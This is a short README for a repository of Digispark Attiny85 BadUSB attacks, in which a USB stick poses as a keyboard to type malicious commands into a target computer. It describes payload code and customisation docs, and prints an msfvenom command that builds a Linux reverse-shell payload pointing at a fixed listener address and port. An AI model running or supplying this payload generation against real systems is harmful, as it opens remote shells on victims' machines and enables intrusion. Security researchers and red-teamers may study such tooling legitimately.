# Digispark BadUSB Attiny85

## Overview

This repository contains code and resources for implementing BadUSB attacks using Digispark Attiny85. BadUSB refers to a type of attack where a USB device emulates a keyboard or other input device to execute malicious commands on a target system.

## Features

- Attiny85 programming for BadUSB attacks.
- Code for various BadUSB payloads.
- Documentation on how to use and customize the code.
- Additional resources on Digispark, Attiny85, and BadUSB attacks.

## simple-revshell-msfvenom.ino used msfvenom command for generate a simple rev shell payload
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.90 LPORT=4465 -f elf > shellcode.elf
```
